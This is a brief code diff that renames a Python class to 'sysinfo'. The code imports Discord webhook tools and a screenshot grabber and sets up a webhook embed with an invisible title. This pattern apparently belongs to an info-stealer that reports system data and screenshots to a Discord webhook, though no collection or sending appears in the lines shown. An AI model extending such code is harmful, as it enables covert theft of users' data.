@@ -11,7 +11,7 @@ from discord import Embed, File, SyncWebhook
 from PIL import ImageGrab
 
 
-class system():
+class sysinfo():
     def __init__(self, webhook: str) -> None:
         webhook = SyncWebhook.from_url(webhook)
         embed = Embed(title="\u200b", color=0x000000)
